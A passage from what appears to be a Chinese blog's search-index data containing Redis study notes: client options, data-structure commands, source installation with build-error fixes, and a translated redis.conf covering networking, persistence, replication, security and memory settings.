分别表示每900秒进行了1次修改操作则进行RDB快照保存每300秒进行了10次修改操作则进行RDB快照保存每60秒进行了10000次修改操作则进行RDB快照保存保存的名称为xxxx# RDB没有载入命令， 服务器启动时检测到有RDB文件就会自动载入# 载入时日志输出 DB loaded from disk：....","tags":[]},{"title":"redis基本命令","text":"客户端连接可选参数 参数 描述 -h 服务器主机名 -p 服务器端口 -s 服务器套接字 -a 服务器密码 -u &lt;uri> 服务器uri -r &lt;repeat> 执行指定的命令n次 -i &lt;interval> 使用-r时，每个命令等待&lt;interval>秒，可以指定亚秒时间，比如-i 0.1 -n 数据库号 -x 从stdin读取最后一个参数 -d &lt;delimiter> multi-bulk delimiter in用于原始格式（默认值为：\\ n） -c 启用群集模式（跟踪-询问和移动重定向） –raw 对回复使用原始格式（当STDOUT不是tty） –no-raw 即使STDOUT不是tty，也强制格式化输出。 –csv 格式的CSV输出 –stat 打印关于服务器的滚动状态：mem，clients，… –latency 进入特殊模式，连续采样延迟。如果在交互式会话中使用此模式，它将运行永远显示实时统计信息。否则，如果–raw或 –csv被指定，或者如果您将输出重定向到非 TTY，它会采样1秒的延迟（您可以使用-i更改间隔），然后产生单个输出然后退出 –latency-history 与–latency类似，但跟踪延迟随时间变化。默认时间间隔是15秒。使用-i进行更改 –latency-dist 将延迟显示为频谱，需要xterm 256色,默认时间间隔是1秒。使用-i进行更改 –lru-test &lt;keys> 模拟80-20分发的缓存工作负载 –replica 模拟显示从主服务器接收的命令的副本 –rdb &lt;文件名>将RDB转储从远程服务器传输到本地文件 –pipe 将原始Redis协议从stdin传输到服务器 –pipe-timeout &lt;n> 在–pipe模式下，如果发送完所有数据后中止并出错。 &lt;n>秒内未收到任何答复。 默认超时：30。使用0永远等待。 –bigkeys 示例Redis键，查找具有许多元素（复杂度）的键。 –memkeys 示例Redis密钥，查找消耗大量内存的密钥。 –memkeys-samples &lt;n> 样本Redis密钥查找消耗大量内存的密钥。并定义要采样的关键元素的数量 –hotkeys 示例Redis键以查找热键。仅在maxmemory-policy为* lfu时有效。 –scan 使用SCAN命令列出所有键。 –pattern &lt;pat> 与–scan一起使用以指定SCAN模式。 –intrinsic-latency &lt;sec> 运行测试以测量内部系统延迟。测试将运行指定的秒数。 –eval &lt;文件> 使用&lt;文件>处的Lua脚本发送EVAL命令 –ldb 与–eval一起使用，启用Redis Lua调试器。 –ldb-sync-mode 与–ldb类似，但在其中使用了同步Lua调试器, 此模式下，服务器被阻止，脚本更改为不从服务器内存回滚。 –cluster &lt;命令> [args …][opts …] 集群管理器命令和参数。 –verbose 详细模式 –no-auth-warning 在命令上使用密码时不显示警告消息线路接口 –help 输出此帮助并退出。 –version 输出版本并退出。 全局命令 查看所有键值 1234keys *# 生产环境中可能会有很多键值，这个命令不要用 键总数 1dbsize 检查键是否存在 1exists key 删除键 1del key [key ...] 设置过期时间 1expire key seconds 获取键过期剩余时间 12345ttl key# 大于0 代表过期剩余时间# -1 没有设置过过期时间# -2 键不存在 键的数据结构类型 123type key# 如果键不存在返回none 字符串命令 设置值 1234567set key value [ex seconds] [px milliseconds] [nx | xx]# 同时有setnx 和 setex两个命令setnx = set key value nxsetex = set key value ex# setnx 可以用于分布式锁， 因为redis是单线程处理机制， setnx key value 命令只会有一个用户设置成功 ex seconds: 设置过期时间，秒 px milliseconds: 设置过期时间， 毫秒 nx: 键必须不存在才能被设置成功，用于添加 xx: 键必须存在才能被设置成功，用于更新 获取值 1get key 批量设置值 1mset key value [key value ...] 批量获取值 1mget key [key ...] 计数 123456789101112131415161718# 整数自增加1incr key# 整数自减减1decr key# 整数自增指定数incrby key increment# 整数自减指定数 decrby key decrement# 自增浮点数 如果要减就设置负数incrbyfloat key increment# 情况1. 值不是整数， 返回错误# 情况2. 键不存在， 按照值为0， 自增# 情况3. 值是整数，返回自增后结果 追加值 1append key value 字符串字节长度 1234strlen key# 如果key不存在返回0# 中文占三个字节， 所以一个中文长度为3 设置并返回值 12345getset key value# 首先获取这个key目前的内容值# 然后设置这个key的值为value# 如果没有这个key 则返回值为nil， 否则为设置之前获取的值 设置指定位置的字符 123setrange key offeset value# 指定位置的字符会被替换， 如果指定的offeset大于目前字符串长度，中间缺少的长度会用\\x00填充 获取部分字符串 123getrange key start end# 如果start为负数将从最后开始计数 哈希 设置值 1234hset key field value# 哈希操作也提供了hsetnx命令，和string操作中的setnx用法相同只是vulue变成field 获取值 1hget key field 删除field 123hdel key field [field ...]# 返回的数字是删除个数 计算field个数 1hlen key 批量设置获取field-value 12hmget key field [field ...]hmset key field value [field value ...] 判断field是否存在 1hexists key field 获取所有field 1hkey key 获取所有的value 1hvals key 获取所有的field-value 123hgetall key# hgetall如果field过多会导致阻塞， 如果要获取全部用hscan命令， hscan会渐进式遍历哈希 哈希计数 1234567hincrby key fieldhicrbyfloat key field# hincrby 等同于 incrby# hincrbyfloat 等同于 incrby 计算value的字符串长度 1hstrlen key field 列表添加操作 从右边插入元素 1rpush key value [value ...] 从左边插入元素 1lpush key value [value ...] 向第一个相同元素的前或者后插入元素 123linsert key before|after pivot value# linsert 只会匹配第一个相同的pivot， 修改成功后就会借书 查找 获取指定范围内的元素列表 1234lrange key start end# 从左到右获取是0 —— n-1， 从右到左获取是 -1 到 -n，， 获取所有的内容 lrange key 0 -1# lrange的start和end都包括了自身 获取列表指定索引下标的元素 1234lindex key index# index &gt;= 0 从左往右# index &lt; 0 从右往左 获取列表长度 1llen key 删除 从左往右删除 1lpop key 从右往左删除 1rpop key 删除指定元素 12345lrem key count value# count&gt;0 从左往右删除最多count个匹配的结果# count&lt;0 从右往左删除最多count个匹配的结果# count=0 删除所有匹配的结果 按照索引范围修剪列表 123ltrim key start end# 只会保留start 到 end 的内容， 如果这个范围为空， 则列表也会为空 修改 修改指定索引下标的元素 123lset key index value# 如果这个key 或者index 超过这个list的长度，会报错 阻塞操作 12345678910blpop key [key ... ] timeoutbrpop key [key ... ] timeout# 阻塞操作是弹出操作的阻塞版本# timeout 是阻塞的时间# 如果列表不为空会立马返回# 如果列表为空， 那么就要将阻塞timeout时间， 当timeout=0时会一直阻塞# 如果在阻塞期间添加了数据，阻塞端会立即返回数据# 如果是多个key， 那么阻塞期间会从左至右遍历key， 一旦有一个key不为空则立马返回# 如果是多个客户端同时阻塞获取同一个key， 会按照请求的时间顺序返回，先来先服务 集合集合内操作 添加元素 1sadd key element [element ...] 删除元素 1srem key element [element ...] 计算元素个数 1scard key 判断元素是否在集合中 1sismember key element 随机从集合返回指定个数元素 1srandmember key [count] # count不写 默认为1 从集合随机弹出元素 1spop key [count] # count不写 默认为1 获取所有元素 12smembers key# 返回结果是无序结果 集合间操作 求多个集合的交集 1sinter key [key ...] 求多个集合的并集 1sunion key [key ...] 求多个集合的差集 1sdiff key [key ...] 将交集、并集、差集的结果保存 12345678sinterstore destination key [key ...]sunionstore destination key [key ...]sdiffstore destination key [key ...]# 命令=原命令+store# destination： 给结果value一个key名称# key [key ...] :需要进行的操作集合 有序集合集合内 添加成员 123456789zadd key score member [score member ...]# zadd 后有四个可选项# nx：member必须不存在才可以设置成功，用于添加# xx：member必须存在才可以设置成功， 用于修改# ch：返回此次操作后有序集合元素和分数发生变化的个数# incr：对score做增加，相当于zincrby# add的时间复杂度为log n 计算成员个数 1zcard key 获取某个成员的分数 1zscore key member 计算某个成员的排名 1234567zrank key memberzrevrank key member# zrank 是从低到高# zrevrank 是从高到低# 第一位是0， 没找到为nil 删除成员 1zrem key member [member ...] 增加成员的分数 1234zincrby key increment member# increment：增加的分数# 如果key不存在则会添加这个key，并将increment设置为初始分数 返回指定排名范围的成员 12345zrange key start end [withscores]zrevrange key start end [withscores]# zrange从低到高， zrevrange从高到低# 如果加上withscores会加上分数一并返回 返回指定分数范围的成员 12345zrangebyscore key min max [withscores] [limit offset count]zrevrangebyscore key min max [withscores] [limit offset count]# zrangebyscore从低到高， zrevrangebyscore 从高到低# min 和 max 表示 min &lt;= score &lt;= max, 如果想使用开区间， 也就是 min &lt; score &lt;= max 可以使用小括号， 即 (min max, 如果想表达无限， 使用负无穷 -inf， 正无穷+inf 返回指定分数范围成员个数 1zcount key min max 删除指定排名内的升序元素 1zremrangebyrank key start end 删除指定分数范围的成员 1zremrangebyscore key min max 集合间的操作 交集 1234567zinterstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum | min | max]# destination 交集计算结果保存到这个键# numkeys 需要做交集计算键的个数# key [key ...]# weights weight [weight ...] 每个键的权重，在做交集计算时，每个键中的每个member会将自己分数乘以这个权重， 每个键的权重默认是1# aggregate sum | min | max :计算成员交集后，分值可以按照sum， min， max做汇总，默认值是sum 并集 123zunionstore destination numkeys key [key ... ] [weights weight [weight ...]] [ aggregate sum|min|max ]# 命令参数与zinsertstore一致 HyperLogLog命令HyperLogLog是用来做基数统计的算法，HyperLogLog的优点是在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的，并且很小很小，只需要12KB内存就可以计算接近2^64个不同元素的基数，但是HyperLogLog只能依据输入的元素算出基数，而不能向set一样输出 添加基数 123pfadd key element [element ...]# 如果HyperLogLog更改了就返回1 否则返回0 返回近似基数 1234pfcount key [key ...]# 返回的基数并不是精确值， 而是一个带有0.81%标准错误，所以这个只能返回近似值 合并HyperLogLog 123pfmerge destkey sourcekey [sourcekey ...]# 合并后保存的名称 sourcekey需要合并的key","path":"2019/09/09/redis基本命令/","date":"09-09","excerpt":"客户端连接可选参数 参数 描述 -h 服务器主机名 -p 服务器端口 -s 服务器套接字 -a 服务器密码 -u &lt;uri> 服务器uri -r &lt;repeat> 执行指定的命令n次 -i &lt;interval> 使用-r时，每个命令等待&lt;interval>秒，可以指定亚秒时间，比如-i 0.1 -n 数据库号 -x 从stdin读取最后一个参数 -d &lt;delimiter> multi-bulk delimiter in用于原始格式（默认值为：\\ n） -c 启用群集模式（跟踪-询问和移动重定向） –raw 对回复使用原始格式（当STDOUT不是tty） –no-raw 即使STDOUT不是tty，也强制格式化输出。 –csv 格式的CSV输出 –stat 打印关于服务器的滚动状态：mem，clients，… –latency 进入特殊模式，连续采样延迟。如果在交互式会话中使用此模式，它将运行永远显示实时统计信息。否则，如果–raw或 –csv被指定，或者如果您将输出重定向到非 TTY，它会采样1秒的延迟（您可以使用-i更改间隔），然后产生单个输出然后退出 –latency-history 与–latency类似，但跟踪延迟随时间变化。默认时间间隔是15秒。使用-i进行更改 –latency-dist 将延迟显示为频谱，需要xterm 256色,默认时间间隔是1秒。使用-i进行更改 –lru-test &lt;keys> 模拟80-20分发的缓存工作负载 –replica 模拟显示从主服务器接收的命令的副本 –rdb &lt;文件名>将RDB转储从远程服务器传输到本地文件 –pipe 将原始Redis协议从stdin传输到服务器 –pipe-timeout &lt;n> 在–pipe模式下，如果发送完所有数据后中止并出错。 &lt;n>秒内未收到任何答复。 默认超时：30。使用0永远等待。 –bigkeys 示例Redis键，查找具有许多元素（复杂度）的键。 –memkeys 示例Redis密钥，查找消耗大量内存的密钥。 –memkeys-samples &lt;n> 样本Redis密钥查找消耗大量内存的密钥。并定义要采样的关键元素的数量 –hotkeys 示例Redis键以查找热键。仅在maxmemory-policy为* lfu时有效。 –scan 使用SCAN命令列出所有键。 –pattern &lt;pat> 与–scan一起使用以指定SCAN模式。 –intrinsic-latency &lt;sec> 运行测试以测量内部系统延迟。测试将运行指定的秒数。 –eval &lt;文件> 使用&lt;文件>处的Lua脚本发送EVAL命令 –ldb 与–eval一起使用，启用Redis Lua调试器。 –ldb-sync-mode 与–ldb类似，但在其中使用了同步Lua调试器, 此模式下，服务器被阻止，脚本更改为不从服务器内存回滚。 –cluster &lt;命令> [args …][opts …] 集群管理器命令和参数。 –verbose 详细模式 –no-auth-warning 在命令上使用密码时不显示警告消息线路接口 –help 输出此帮助并退出。 –version 输出版本并退出。","tags":[]},{"title":"了解redis","text":"redis数据库 非关系型数据库 以键(key)和值(value)做映射(mapping) value类型： string：字符串对象 list：列表对象 hash：哈希对象 set：集合对象 zset：有序集合对象 类型(前缀：REDIS)编码(前缀：REDIS_ENCODING)对象结构的读写能力STRINGINT(long类型整数)整数值实现字符串对象对整个字符串或者字符串的其一部分执行操作，对整数的浮点数执行自增或者自减操作STRINGEMBSTR(embstr编码的简单字符串)embstr编码的简单动态字符串实现的字符串对象STRINGRAW(简单动态字符串)动态字符串实现的字符串对象LISTZIPLIST(压缩列表)压缩列表实现的列表对象从链表的两端推入或者弹出元素，根据偏移量对链表进行修剪，读取单个或者多个元素，根据值查找或者移除元素LISTLINKEDLIST(双端链表)双端链表实现的列表对象HASHZIPLIST(压缩列表)压缩列表实现的哈希对象添加、获取、移除单个键值对，获取所有键值对HASHHT(字典)字典实现的哈希对象SETINTSET(整数集合)整数集合实现的集合对象添加、获取、移除单个元素，检查一个元素是否存在与集合，计算交集，并集，差集，从集合里面随机获取元素SETHT(字典)字典实现的集合对象ZSETZIPLIST(压缩列表)压缩列表实现的有序集合对象添加、获取、移除单个元素，根据分值范围或者成员来获取元素ZSETSKIPLIST(跳跃表和字典)跳跃表和字典实现的有序集合对象 可以将内存中的数据进行落盘 存储命令 save：主线程将数据快照存储为rdb，存储期间redis不接受其他请求 bgsave：fork一个子进程进行快照存储，存储期间redis可以处理其他请求 存储方式 时间点转储：在指定时间内进行了指定次数的操作即可开始转储 AOF存储：每条修改命令都追加写入AOF文件， 可以设置成每秒追加或者每一条都追加 读性能扩展： 利用复制特性，例如主从服务器进行读写分离 写性能扩张： 利用客户端分片， 例如 mod( hash(id), n) = x, 通过这个方法就可以得到id在n台服务器的情况下存储到第x服务器上 速度快：10QPS/s 内存操作 C语言实现，最接近底层 单线程架构，预防多线程可能产生问题 redis的精细打磨 相似类型数据库对比 名称 类型 数据存储选项 查询类型 附加功能 Redis 使用内存存储的NoSql 字符串、列表、集合、散列表、有序集合 每种数据类型都有自己的专属命令，另外还有批量操作和不完全的事物支持 发布与订阅，主从复制，持久化，脚本（存储过程） memcached 使用内存存储的键值缓存 键值字符串映射 创建、读取、更新、删除等命令 为提升性能而设的多线程服务器 mysql 关系数据库 每个数据库可以包含多个表，每个表可以包含多个行，可以处理多个表的视图，支持空间和第三方扩展 SELECT、INSERT、UPDATE、DELETE、函数、存储过程 支持ACID性质、主从复制和主主复制 postgreSql 关系数据库 每个数据库可以包含多个表，每个表可以包含多个行，可以处理多个表的视图，支持空间和第三方扩展，支持可定制类型 SELECT、INSERT、UPDATE、DELETE、内置函数、自定义的存储过程 支持ACID性质，主从复制，第三方支持的多复制 MongoDB 使用硬盘存储的非关系文档存储 每个数据库可以包含多个表，每个表可以包含多个无schema的BSON文档 创建命令、读取命令、更新命令、删除命令、条件查询命令等 支持map-reduce操作、主从复制、分片、空间索引 redis对比其他数据库优势 列表管理：拥有List和Set两种类型可以直接添加或者删除元素 数据存储： 原子的INCR命令及其变种来计算聚合数据，因为数据存储在内存中，不需要经过查询分析器或者查询优化器处理 避免写入不必要的临时数据，也免去对临时数据进行扫描或者删除的麻烦 redis用途 缓存 减缓后端压力，加快访问速度 排行版系统 redis提供列表和有序集合数据结构 计数器应用 高并发特性，支持计数功能 社交网络 数据结构多样，适应多种数据存储类型 消息队列系统 发布订阅和阻塞队列功能可以满足基本的消息队列功能 redis局限 大量数据的存储局限性 冷热数据处理——热数据应该放置内存中，冷数据不应该放在内存中浪费内存 安装redis安装流程 下载源码 12345wget http://download.redis.io/releases/redis-5.0.5.tar.gz# wget工具可以通过以下命令安装apt-get install wget 解压 1tar -zxvf redis-5.0.0.tar.gz 编译 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 进入redis文件夹cd redis-5.0.5make# 测试是否正确make test# 报错1cd src &amp;&amp; make allmake[1]: Entering directory '/root/redis-5.0.5/src' CC adlist.o/bin/sh: 1: cc: not foundMakefile:248: recipe for target 'adlist.o' failedmake[1]: *** [adlist.o] Error 127make[1]: Leaving directory '/root/redis-5.0.5/src'Makefile:6: recipe for target 'all' failedmake: *** [all] Error 2# 报错原因[1]——没有安装gccapt-get install gcc# 报错2cd src &amp;&amp; make allmake[1]: Entering directory '/root/redis-5.0.5/src' CC adlist.oIn file included from adlist.c:34:0:zmalloc.h:50:10: fatal error: jemalloc/jemalloc.h: No such file or directory #include &lt;jemalloc/jemalloc.h&gt; ^~~~~~~~~~~~~~~~~~~~~compilation terminated.Makefile:248: recipe for target 'adlist.o' failedmake[1]: *** [adlist.o] Error 1make[1]: Leaving directory '/root/redis-5.0.5/src'Makefile:6: recipe for target 'all' failedmake: *** [all] Error 2# 报错原因[2]——关于分配器allocator， 如果有MALLOC 这个 环境变量， 会有用这个环境变量的 去建立Redis。而且libc 并不是默认的 分配器， 默认的是jemalloc, 因为 jemalloc被证明比libc有更少的 碎片问题 。但是如果你又没有jemalloc 而只有 libc 当然 make 出错。 make MALLOC=libc# 报错3You need tcl 8.5 or newer in order to run the Redis testmake:# 解决方法——安装tclapt-get install tcl 安装 1make install 配置文件翻译123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286######################### 引用 ########################## 不同redis server可以使用同一个模版配置作为主配置，并引用其它配置文件用于本server的个性# 化设置# include并不会被CONFIG REWRITE命令覆盖。但是主配置文件的选项会被覆盖。# 想故意覆盖主配置的话就把include放文件前面，否则最好放末尾# include /path/to/local.conf# include /path/to/other.conf######################### 网络 ########################## 不指定bind的话redis将会监听所有网络接口。这个配置是肯定需要指定的。# Examples:# bind 192.168.1.100 10.0.0.1# bind 127.0.0.1 ::1# 下面这个配置是只允许本地客户端访问。bind 127.0.0.1# 是否开启保护模式。默认开启，如果没有设置bind项的ip和redis密码的话，服务将只允许本地访 问。protected-mode yes# 端口设置，默认为 6379 # 如果port设置为0 redis将不会监听tcp socketport 6379# 在高并发环境下需要一个高backlog值来避免慢客户端连接问题。注意Linux内核默默将这个值减小到/proc/sys/net/core/somaxconn的值，所以需要确认增大somaxconn和tcp_max_syn_backlog 两个值来达到需要的效果。tcp-backlog 511# 指定用来监听Unix套套接字的路径。没有默认值，没有指定的情况下Redis不会监听Unix socket# unixsocket /tmp/redis.sock# unixsocketperm 700# 客户端空闲多少秒后关闭连接（0为不关闭）timeout 0# tcp-keepalive设置。如果非零，则设置SO_KEEPALIVE选项来向空闲连接的客户端发送ACK，用途如下：# 1）能够检测无响应的对端# 2）让该连接中间的网络设备知道这个连接还存活# 在Linux上，这个指定的值(单位秒)就是发送ACK的时间间隔。# 注意：要关闭这个连接需要两倍的这个时间值。# 在其他内核上这个时间间隔由内核配置决定# 从redis3.2.1开始默认值为300秒tcp-keepalive 300######################### 通用 ########################## 是否将Redis作为守护进程运行。如果需要的话配置成&apos;yes&apos;# 注意配置成守护进程后Redis会将进程号写入文件/var/run/redis.piddaemonize no# 是否通过upstart或systemd管理守护进程。默认no没有服务监控，其它选项有upstart, systemd, autosupervised no# pid文件在redis启动时创建，退出时删除。最佳实践为配置该项。pidfile /var/run/redis_6379.pid# 配置日志级别。选项有debug, verbose, notice, warningloglevel notice# 日志名称。空字符串表示标准输出。注意如果redis配置为后台进程，标准输出中信息会发送到/dev/nulllogfile &quot;&quot;# 是否启动系统日志记录。# syslog-enabled no# 指定系统日志身份。# syslog-ident redis# 指定syslog设备。必须是user或LOCAL0 ~ LOCAL7之一。# syslog-facility local0# 设置数据库个数。默认数据库是 DB 0# 可以通过SELECT where dbid is a number between 0 and &apos;databases&apos;-1为每个连接使用不同的数据库。databases 16######################### 备份 ########################## 持久化设置:# 下面的例子将会进行把数据写入磁盘的操作:# 900秒（15分钟）之后，且至少1次变更# 300秒（5分钟）之后，且至少10次变更# 60秒之后，且至少10000次变更# 不写磁盘的话就把所有 &quot;save&quot; 设置注释掉就行了。# 通过添加一条带空字符串参数的save指令也能移除之前所有配置的save指令，如: save &quot;&quot;save 900 1save 300 10save 60 10000# 默认情况下如果上面配置的RDB模式开启且最后一次的保存失败，redis 将停止接受写操作，让用户知道问题的发生。# 如果后台保存进程重新启动工作了，redis 也将自动的允许写操作。如果有其它监控方式也可关闭。stop-writes-on-bgsave-error yes# 是否在备份.rdb文件时是否用LZF压缩字符串，默认设置为yes。如果想节约cpu资源可以把它设置为no。rdbcompression yes# 因为版本5的RDB有一个CRC64算法的校验和放在了文件的末尾。这将使文件格式更加可靠,# 但在生产和加载RDB文件时，这有一个性能消耗(大约10%)，可以关掉它来获取最好的性能。# 生成的关闭校验的RDB文件有一个0的校验和，它将告诉加载代码跳过检查rdbchecksum yes# rdb文件名称dbfilename dump.rdb# 备份文件目录，文件名就是上面的 &quot;dbfilename&quot; 的值。累加文件也放这里。# 注意你这里指定的必须是目录，不是文件名。dir /your data path/######################### 主从同步 ########################## 主从同步配置。# 1) redis主从同步是异步的，但是可以配置在没有指定slave连接的情况下使master停止写入数据。# 2) 连接中断一定时间内，slave可以执行部分数据重新同步。# 3) 同步是自动的，slave可以自动重连且同步数据。# slaveof &lt;masterip&gt; &lt;masterport&gt;# master连接密码# masterauth &lt;master-password&gt;# 当一个slave失去和master的连接，或者同步正在进行中，slave的行为有两种可能：# 1) 如果 slave-serve-stale-data 设置为 &quot;yes&quot; (默认值)，slave会继续响应客户端请求，可能是正常数据，也可能是还没获得值的空数据。# 2) 如果 slave-serve-stale-data 设置为 &quot;no&quot;，slave会回复&quot;正在从master同步（SYNC with master in progress）&quot;来处理各种请求，除了 INFO 和 SLAVEOF 命令。slave-serve-stale-data yes# 你可以配置salve实例是否接受写操作。可写的slave实例可能对存储临时数据比较有用(因为写入salve# 的数据在同master同步之后将很容被删除)，但是如果客户端由于配置错误在写入时也可能产生一些问题。# 从Redis2.6默认所有的slave为只读# 注意:只读的slave不是为了暴露给互联网上不可信的客户端而设计的。它只是一个防止实例误用的保护层。# 一个只读的slave支持所有的管理命令比如config,debug等。为了限制你可以用&apos;rename-command&apos;来隐藏所有的管理和危险命令来增强只读slave的安全性。slave-read-only yes# 同步策略: 磁盘或socket，默认磁盘方式repl-diskless-sync no# 如果非磁盘同步方式开启，可以配置同步延迟时间，以等待master产生子进程通过socket传输RDB数据给slave。# 默认值为5秒，设置为0秒则每次传输无延迟。repl-diskless-sync-delay 5# slave根据指定的时间间隔向master发送ping请求。默认10秒。# repl-ping-slave-period 10# 同步的超时时间# 1）slave在与master SYNC期间有大量数据传输，造成超时# 2）在slave角度，master超时，包括数据、ping等# 3）在master角度，slave超时，当master发送REPLCONF ACK pings# 确保这个值大于指定的repl-ping-slave-period，否则在主从间流量不高时每次都会检测到超时# repl-timeout 60# 是否在slave套接字发送SYNC之后禁用 TCP_NODELAY# 如果选择yes，Redis将使用更少的TCP包和带宽来向slaves发送数据。但是这将使数据传输到slave上有延迟，Linux内核的默认配置会达到40毫秒。# 如果选择no，数据传输到salve的延迟将会减少但要使用更多的带宽。# 默认我们会为低延迟做优化，但高流量情况或主从之间的跳数过多时，可以设置为“yes”。repl-disable-tcp-nodelay no# 设置数据备份的backlog大小。backlog是一个slave在一段时间内断开连接时记录salve数据的缓冲，所以一个slave在重新连接时，不必要全量的同步，而是一个增量同步就足够了，将在断开连接的这段# 时间内把slave丢失的部分数据传送给它。# 同步的backlog越大，slave能够进行增量同步并且允许断开连接的时间就越长。# backlog只分配一次并且至少需要一个slave连接。# repl-backlog-size 1mb# 当master在一段时间内不再与任何slave连接，backlog将会释放。以下选项配置了从最后一个# slave断开开始计时多少秒后，backlog缓冲将会释放。# 0表示永不释放backlog# repl-backlog-ttl 3600# slave的优先级是一个整数展示在Redis的Info输出中。如果master不再正常工作了，sentinel将用它来选择一个slave提升为master。# 优先级数字小的salve会优先考虑提升为master，所以例如有三个slave优先级分别为10，100，25，sentinel将挑选优先级最小数字为10的slave。# 0作为一个特殊的优先级，标识这个slave不能作为master，所以一个优先级为0的slave永远不会被# sentinel挑选提升为master。# 默认优先级为100slave-priority 100# 如果master少于N个延时小于等于M秒的已连接slave，就可以停止接收写操作。# N个slave需要是“oneline”状态。# 延时是以秒为单位，并且必须小于等于指定值，是从最后一个从slave接收到的ping（通常每秒发送）开始计数。# 该选项不保证N个slave正确同步写操作，但是限制数据丢失的窗口期。# 例如至少需要3个延时小于等于10秒的slave用下面的指令：# min-slaves-to-write 3# min-slaves-max-lag 10# 两者之一设置为0将禁用这个功能。# 默认 min-slaves-to-write 值是0（该功能禁用）并且 min-slaves-max-lag 值是10。######################### 安全 ########################## 要求客户端在处理任何命令时都要验证身份和密码。# requirepass foobared# 命令重命名# 在共享环境下，可以为危险命令改变名字。比如，你可以为 CONFIG 改个其他不太容易猜到的名字，这样内部的工具仍然可以使用。# 例如：# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52# 也可以通过改名为空字符串来完全禁用一个命令# rename-command CONFIG &quot;&quot;# 请注意：改变命令名字被记录到AOF文件或被传送到从服务器可能产生问题。######################### 限制 ########################## 设置最多同时连接的客户端数量。默认这个限制是10000个客户端，然而如果Redis服务器不能配置# 处理文件的限制数来满足指定的值，那么最大的客户端连接数就被设置成当前文件限制数减32（因为Redis服务器保留了一些文件描述符作为内部使用）# 一旦达到这个限制，Redis会关闭所有新连接并发送错误&apos;max number of clients reached&apos;# maxclients 10000# 不要使用比设置的上限更多的内存。一旦内存使用达到上限，Redis会根据选定的回收策略（参见：maxmemmory-policy）删除key。# 如果因为删除策略Redis无法删除key，或者策略设置为 &quot;noeviction&quot;，Redis会回复需要更多内存的错误信息给命令。例如，SET,LPUSH等等，但是会继续响应像Get这样的只读命令。# 在使用Redis作为LRU缓存，或者为实例设置了硬性内存限制的时候（使用 &quot;noeviction&quot; 策略）的时候，这个选项通常事很有用的。# 警告：当有多个slave连上达到内存上限时，master为同步slave的输出缓冲区所需内存不计算在使用内存中。这样当移除key时，就不会因网络问题 / 重新同步事件触发移除key的循环，反过来slaves的输出缓冲区充满了key被移除的DEL命令，这将触发删除更多的key，直到这个数据库完全被清空为止。# 总之，如果你需要附加多个slave，建议你设置一个稍小maxmemory限制，这样系统就会有空闲的内存作为slave的输出缓存区(但是如果最大内存策略设置为&quot;noeviction&quot;的话就没必要了)# maxmemory &lt;bytes&gt;# 最大内存策略：如果达到内存限制了，Redis如何选择删除key。# volatile-lru -&gt; 根据LRU算法删除设置过期时间的key# allkeys-lru -&gt; 根据LRU算法删除任何key# volatile-random -&gt; 随机移除设置过过期时间的key# allkeys-random -&gt; 随机移除任何key# volatile-ttl -&gt; 移除即将过期的key(minor TTL)# noeviction -&gt; 不移除任何key，只返回一个写错误# 注意：对所有策略来说，如果Redis找不到合适的可以删除的key都会在写操作时返回一个错误。# 目前为止涉及的命令：set setnx setex append incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby getset mset msetnx exec sort# 默认策略:# maxmemory-policy noeviction# LRU和最小TTL算法的实现都不是很精确，但是很接近（为了省内存），所以你可以用样本量做检测。 例如：默认Redis会检查3个key然后取最旧的那个，你可以通过下面的配置指令来设置样本的个数。# 默认值为5，数字越大结果越精确但是会消耗更多CPU。# maxmemory-samples 5######################### APPEND ONLY MODE ########################## 默认情况下，Redis是异步的把数据导出到磁盘上。这种模式在很多应用里已经足够好，但Redis进程出问题或断电时可能造成一段时间的写操作丢失(这取决于配置的save指令)。# AOF是一种提供了更可靠的替代持久化模式，例如使用默认的数据写入文件策略（参见后面的配置）。# 在遇到像服务器断电或单写情况下Redis自身进程出问题但操作系统仍正常运行等突发事件时，Redis能只丢失1秒的写操作。# AOF和RDB持久化能同时启动并且不会有问题。# 如果AOF开启，那么在启动时Redis将加载AOF文件，它更能保证数据的可靠性。appendonly no# AOF文件名（默认：&quot;appendonly.aof&quot;）appendfilename &quot;appendonly.aof&quot;# fsync() 系统调用告诉操作系统把数据写到磁盘上，而不是等更多的数据进入输出缓冲区。# 有些操作系统会真的把数据马上刷到磁盘上；有些则会尽快去尝试这么做。# Redis支持三种不同的模式：# no：不要立刻刷，只有在操作系统需要刷的时候再刷。比较快。# always：每次写操作都立刻写入到aof文件。慢，但是最安全。# everysec：每秒写一次。折中方案。# 默认的 &quot;everysec&quot; 通常来说能在速度和数据安全性之间取得比较好的平衡。# appendfsync alwaysappendfsync everysec# appendfsync no# 如果AOF的同步策略设置成 &quot;always&quot; 或者 &quot;everysec&quot;，并且后台的存储进程（后台存储或写入AOF 日志）会产生很多磁盘I/O开销。某些Linux的配置下会使Redis因为 fsync()系统调用而阻塞很久。# 注意，目前对这个情况还没有完美修正，甚至不同线程的 fsync() 会阻塞我们同步的write(2)调用。# 为了缓解这个问题，可以用下面这个选项。它可以在 BGSAVE 或 BGREWRITEAOF 处理时阻止fsync()。# 这就意味着如果有子进程在进行保存操作，那么Redis就处于&quot;不可同步&quot;的状态。# 这实际上是说，在最差的情况下可能会丢掉30秒钟的日志数据。（默认Linux设定）# 如果把这个设置成&quot;yes&quot;带来了延迟问题，就保持&quot;no&quot;，这是保存持久数据的最安全的方式。no-appendfsync-on-rewrite no# 自动重写AOF文件。如果AOF日志文件增大到指定百分比，Redis能够通过 BGREWRITEAOF 自动重写AOF日志文件。# 工作原理：Redis记住上次重写时AOF文件的大小（如果重启后还没有写操作，就直接用启动时的AOF大小）# 